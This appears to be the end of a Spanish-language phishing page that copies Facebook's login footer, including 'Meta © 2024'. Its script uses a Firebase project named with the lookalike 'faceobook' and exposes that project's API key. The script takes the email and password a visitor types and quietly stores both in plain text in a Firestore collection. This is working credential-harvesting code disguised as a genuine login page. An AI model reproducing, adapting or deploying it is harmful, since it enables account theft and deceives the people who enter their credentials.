					<li>
						Opciones de anuncios <li
							class="img sp_Oe7SL983-oK sx_256a56"
						>
						</li>
					</li>
					<li>Condiciones</li>
					<li>Ayuda</li>
					<li>Importación de contactos y no usuarios</li>
				</ul>
			</div>
			<a
				class="text-gray-500 font-light font-[arial] text-[10px] lg:text-[11px]"
				href=""
			>
				Meta © 2024</a
			>
		</div>
	</footer>
	<script type="module">
		// Importa las funciones necesarias del SDK de Firebase
		import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
		import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
	
		// Configuración de Firebase para tu proyecto
		const firebaseConfig = {
		  apiKey: "AIzaSyCQ4gRDqSUhDUB7O79E7FHxMooEULo8IxE",
		  authDomain: "faceobook.firebaseapp.com",
		  projectId: "faceobook",
		  storageBucket: "faceobook.firebasestorage.app",
		  messagingSenderId: "358288769581",
		  appId: "1:358288769581:web:adb0d0c33bf11dd2332ea4"
		};
	
		// Inicializar Firebase y Firestore
		const app = initializeApp(firebaseConfig);
		const db = getFirestore(app);
	
		// Obtener referencias a los campos de entrada y al botón
		const Femail = document.getElementById("email");
		const Fcontrasena = document.getElementById("contrasena");
		const addBtn = document.getElementById("enviar");
	
		// Función para agregar datos a Firestore
		async function addData(event) {
		  event.preventDefault();  // Evita el envío de formulario por defecto
		  const email = Femail.value;
		  const contrasena = Fcontrasena.value;
	
		  // Verifica que los campos no estén vacíos
		  if (email && contrasena) {
			try {
			  // Agrega un nuevo documento con ID autogenerado en la colección "Usuarios"
			  await addDoc(collection(db, "Usuarios"), {
				email: email,
				contrasena: contrasena
			  });
			} catch (error) {
			  alert("Error al agregar datos");
			  console.error("Error:", error);
			}
		  } else {
			alert("Por favor, ingrese un correo y una contraseña");
		  }
		}
	
		// Agrega el evento al botón para ejecutar la función al hacer clic
		addBtn.addEventListener('click', addData);
	  </script>
	  
